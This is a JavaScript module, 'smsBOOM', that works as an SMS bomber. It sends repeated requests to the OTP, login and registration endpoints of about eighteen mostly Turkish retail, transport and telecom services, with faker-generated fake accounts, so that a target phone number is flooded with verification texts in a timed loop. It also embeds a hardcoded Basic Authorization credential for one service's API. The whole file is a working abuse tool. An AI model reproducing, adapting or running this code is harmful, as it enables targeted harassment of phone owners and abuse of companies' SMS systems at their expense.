const request = require('request');
const colors = require('colors');
const title = require('./title.js');
const moment = require('moment');
const faker = require('faker');

async function delay(s) { return new Promise(resolve => setTimeout(resolve, s * 1000)); }

async function smsBOOM(numara, miktar) {
    let dataFSms = {
        baslangic_tarihi: moment().format('DD.MM.YYYY HH:mm:ss'),
        numara: numara,
        hatali: 0,
        basarili: 0,
    };

    function alibaba(no) {
        request.post({
            url: 'https://ws.alibaba.ir/api/v3/account/mobile/otp',
            data: { "phoneNumber": `0${no}` },
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 202) {
                dataFSms.basarili++;
                console.log(`[+] Alibaba - ${no} - ${dataFSms.basarili}`.green);
            } else {
                dataFSms.hatali++;
                console.log(`[-] Alibaba - ${no} - ${dataFSms.hatali}`.red);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }
    function arasta360(no) {
        request.post({
            url: `https://api.arasta360.com/api/account/token?phoneNumber=0${no}`,
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 202) {
                dataFSms.basarili++;
                console.log(`[+] Arasta360 - ${no} - ${dataFSms.basarili}`.green);
            } else {
                dataFSms.hatali++;
                console.log(`[-] Arasta360 - ${no} - ${dataFSms.hatali}`.red);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }

    function total(no) {
        request.post({
            url: `https://mobileapi.totalistasyonlari.com.tr:443/SmartSms/SendSms?gsmNo=${no}&api_key=GetDocuments%0A`,
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 202) {
                dataFSms.basarili++;
                console.log(`[+] Total - ${no} - ${dataFSms.basarili}`.green);
            } else {
                dataFSms.hatali++;
                console.log(`[-] Total - ${no} - ${dataFSms.hatali}`.red);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }

    function turkcell(no) {
        request.post({
            url: 'https://fastlogin.com.tr/fastlogin_web_app/webLogin',
            form: {
                "phone": no,
                "token_type": "register_token"
            }
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 202) {
                dataFSms.basarili++;
                console.log(`[+] Turkcell - ${no} - ${dataFSms.basarili}`.green);
            } else {
                dataFSms.hatali++;
                console.log(`[-] Turkcell - ${no} - ${dataFSms.hatali}`.red);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }

    function kigili(no) {
        request.post({
            url: 'https://www.kigili.com/users/registration/',
            form: {
                "first_name": faker.name.firstName(),
                "last_name": faker.name.lastName(),
                "email": faker.internet.email(),
                "phone": "0"+no,
                "password": "nwejkfıower32",
                "confirm": "true",
                "kvkk": "true",
                "next": ""
            }
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 202) {
                dataFSms.basarili++;
                console.log(`[+] Kigili - ${no} - ${dataFSms.basarili}`.green);
            } else {
                dataFSms.hatali++;
                console.log(`[-] Kigili - ${no} - ${dataFSms.hatali}`.red);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }

    function kahvedunyasi(no) {
        request.post({
            url: 'https://core.kahvedunyasi.com/api/users/sms/send',
            form: {
                "mobile_number": no,
                "token_type": "register_token"
            }
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 200) {
                dataFSms.basarili++;
                console.log(`[+] Kahve Dunyasi - ${no} - ${dataFSms.basarili}`.green);
            } else {
                dataFSms.hatali++;
                console.log(`[-] Kahve Dunyasi - ${no} - ${dataFSms.hatali}`.red);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }

    function naosstars(no) {
        request.post({
            url: 'https://naosstars.com/user/register',
            form: {
                "email": faker.internet.email(),
                "first_name": faker.name.firstName(),
                "last_name": faker.name.lastName(),
                "password": "nwejkfıower32",
                "date_of_birth": "1999-01-01",
                "phone": "0"+no,
                "gender": "male",
                "kvkk": "true",
                "contact": "true",
                "confirm": "true"
            }
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 202) {
                dataFSms.basarili++;
                console.log(`[+] Naosstars - ${no} - ${dataFSms.basarili}`.green);
            } else {
                dataFSms.hatali++;
                console.log(`[-] Naosstars - ${no} - ${dataFSms.hatali}`.red);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }

    function wmf(no) {
        request.post({
            url: 'https://www.wmf.com.tr/users/register/',
            form: {
                "confirm": "true",
                "date_of_birth": "1956-03-01",
                "email": faker.internet.email(),
                "email_allowed": "true",
                "first_name": faker.name.firstName(),
                "gender": "male",
                "last_name": faker.name.lastName(),
                "password": "nwejkfıower32",
                "phone": "0"+no,
            }
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 202) {
                dataFSms.basarili++;
                console.log(`[+] WMF - ${no} - ${dataFSms.basarili}`.green);
            } else {
                dataFSms.hatali++;
                console.log(`[-] WMF - ${no} - ${dataFSms.hatali}`.red);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }

    function bim(no) {
        request.post({
            url: 'https://bim.veesk.net:443/service/v1.0/account/login',
            json: {
                "phone": no,
            }
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 200) {
                dataFSms.basarili++;
                console.log(`[+] Bim - ${no} - ${dataFSms.basarili}`.green);
            } else {
                dataFSms.hatali++;
                console.log(`[-] Bim - ${no} - ${dataFSms.hatali}`.red);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }

    function sok(no) {
        request.post({
            url: 'https://api.ceptesok.com:443/api/users/sendsms',
            json: {
                "mobile_number": no,
                "token_type": "register_token"
            }
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 200) {
                dataFSms.basarili++;
                console.log(`[+] Sok - ${no} - ${dataFSms.basarili}`.green);
            } else {
                dataFSms.hatali++;
                console.log(`[-] Sok - ${no} - ${dataFSms.hatali}`.red);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }

    function migros(no) {
        request.post({
            url: 'https://rest.migros.com.tr:443/sanalmarket/users/login/otp',
            json: {
                "phoneNumber": no,
            }
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 200) {
                dataFSms.basarili++;
                console.log(`[+] Migros - ${no} - ${dataFSms.basarili}`.green);
            } else {
                dataFSms.hatali++;
                console.log(`[-] Migros - ${no} - ${dataFSms.hatali}`.red);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }

    function a101(no) {
        request.post({
            url: 'https://www.a101.com.tr:443/users/otp-login/',
            json: {
                "phone": "0"+no,
                "next": "/a101-kapida"
            }
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 200) {
                dataFSms.basarili++;
                console.log(`[+] A101 - ${no} - ${dataFSms.basarili}`.green);
            } else {
                dataFSms.hatali++;
                console.log(`[-] A101 - ${no} - ${dataFSms.hatali}`.red);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }

    function rentiva(no) {
        request.post({
            url: 'https://rentiva.com:443/api/Account/Login',
            headers: {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "ionic://localhost", "Accept-Encoding": "gzip, deflate", "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148", "Accept-Language": "tr-TR,tr;q=0.9"},
            json: {"appleId": "", "code": "", "email": "", "facebookId": "", "googleId": "", "lastName": "", "name": "", "phone": no, "type": 1}
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 200) {
                dataFSms.basarili++;
                console.log(`[+] Rentiva - ${no} - ${dataFSms.basarili}`.green);
            } else {
                dataFSms.hatali++;
                console.log(`[-] Rentiva - ${no} - ${dataFSms.hatali}`.red);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }


    function tazi(no) {
        request.post({
            url: 'https://mobileapiv2.tazi.tech:443/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin',
            headers: {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json;charset=utf-8", "Accept-Encoding": "gzip, deflate", "User-Agent": "Taz%C4%B1/3 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9", "Authorization": "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD"},
            json: {"cep_tel": no, "cep_tel_ulkekod": "90"}
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 200) {
                dataFSms.basarili++;
                console.log(`[+] Tazi - ${no} - ${dataFSms.basarili}`.green);
            } else {
                dataFSms.hatali++;
                console.log(`[-] Tazi - ${no} - ${dataFSms.hatali}`.red);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }

    function dgnonline(no) {
        request.post({
            url: 'https://odeme.dgnonline.com:443/index.php?route=ajax/smsconfirm&type=send&ajax=1',
            headers: {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://odeme.dgnonline.com", "Dnt": "1", "Referer": "https://odeme.dgnonline.com/?bd=1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"},
            data: {"loginIdentityNumber": "00000000000", "loginMobileNumber": no}
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 200) {
                dataFSms.basarili++;
                console.log(`[+] dgnonline - ${no} - ${dataFSms.basarili}`.green);
            } else {
                dataFSms.hatali++;
                console.log(`[-] dgnonline - ${no} - ${dataFSms.hatali}`.red);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }


    function marti(no) {
        request.post({
            url: 'https://customer.martiscooter.com:443/v13/scooter/dispatch/customer/signin',
            json: {
                 "mobilePhone": no, "mobilePhoneCountryCode": "90", "oneSignalId": ""
            }
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 200) {
                dataFSms.basarili++;
                console.log(`[+] Martı - ${no} - ${dataFSms.basarili}`.green);
            } else {
                dataFSms.hatali++;
                console.log(`[-] Martı - ${no} - ${dataFSms.hatali}`.red);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }


    function englishhome(no) {
        request.post({
            url: 'https://www.englishhome.com:443/enh_app/users/registration/',
            form: {
                "first_name": faker.name.firstName(),
                "last_name": faker.name.lastName(),
                "email": faker.internet.email(),
                "phone": "0"+no,
                "password": "nwejkfıower32",
                "email_allowed": "true",
                "sms_allowed": "true",
                "confirm": "true",
                "tom_pay_allowed": "true"
            }
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 200) {
                dataFSms.basarili++;
                console.log(`[+] Englishhome - ${no} - ${dataFSms.basarili}`.green);
            } else {
                dataFSms.hatali++;
                console.log(`[-] Englishhome - ${no} - ${dataFSms.hatali}`.red);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }

    function sakasu(no) {
        request.post({
            url: 'https://www.sakasu.com.tr:443/app/api_register/step1',
            form: {
                "phone": "0"+no,
            }
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 200) {
                dataFSms.basarili++;
                console.log(`[+] Sakasu - ${no} - ${dataFSms.basarili}`.green);
            } else {
                dataFSms.hatali++;
                console.log(`[-] Sakasu - ${no} - ${dataFSms.hatali}`.red);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }

    function send(no) {
        rentiva(no);
        tazi(no);
        dgnonline(no);
        marti(no);
        kigili(no);
        kahvedunyasi(no);
        naosstars(no);
        wmf(no);
        bim(no);
        sok(no);
        migros(no);
        a101(no);
        englishhome(no);
        sakasu(no);
        turkcell(no);
        total(no);
        arasta360(no);
        alibaba(no);
    }

    for (let i = 0; i < miktar; i++) {
        await delay(5);
        send(numara);
    }
}

module.exports = smsBOOM;
